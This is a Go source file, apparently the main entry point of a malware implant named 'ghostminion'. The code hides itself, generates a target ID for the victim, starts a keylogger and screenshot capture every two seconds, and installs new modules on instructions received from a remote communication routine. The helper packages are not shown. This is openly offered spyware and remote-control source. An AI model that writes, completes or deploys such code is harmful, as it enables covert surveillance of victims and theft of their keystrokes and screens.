package main

import (
	"fmt"
	"ghostminion/apps"
	"ghostminion/communication"
	"ghostminion/config"
	"ghostminion/db"
	"ghostminion/hider"
	"ghostminion/persistence"
	"log"
	"sync"
)

func main() {
	var wg sync.WaitGroup
	wg.Add(1) // for "run" function

	configInstance, err := config.LoadConfig("../config.yaml") //get from configPath
	if err != nil {
		panic(err)
	}

	err = hider.Hide()
	if err != nil {
		panic(err)
	}

	err = db.Init(configInstance.Installation.DBPath, configInstance.Installation.DBPassword)
	if err != nil {
		panic(err)
	}

	targetId := persistence.GenerateTargetID()
	fmt.Println("targetId:", targetId)

	appManager := apps.GetAppManagerInstance()
	appManager.AddApp(string(apps.KeyLoggerTask)+"_default", &apps.KeyLoggerApp{})
	appManager.AddApp(string(apps.ScreenShotTask)+"_default", &apps.ScreenshotApp{Interval: 2})
	appManager.AddApp("security_guard", &apps.SecurityGuardApp{})
	appManager.StartAll(&wg)

	taskCh := make(chan apps.AppData)
	go communication.Routine(taskCh)
	for task := range taskCh {
		if app, err := apps.NewAppFactory(task); err != nil {
			log.Print(err)
		} else {
			appManager.AddApp(task.Name, app)
		}
	}

	appManager.StopAll()
}
